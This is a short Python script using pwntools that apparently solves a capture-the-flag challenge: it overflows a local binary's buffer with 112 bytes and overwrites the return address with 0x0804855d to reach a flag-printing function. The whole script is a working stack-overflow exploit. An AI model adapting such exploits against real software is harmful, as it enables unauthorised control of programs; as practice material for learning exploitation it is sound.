from pwn import *
#context.log_level = 'debug'

t = process('./bin')
t.send('a'*112+p32(0x0804855d))

flag = t.recv()
log.success('get flag:' + flag)
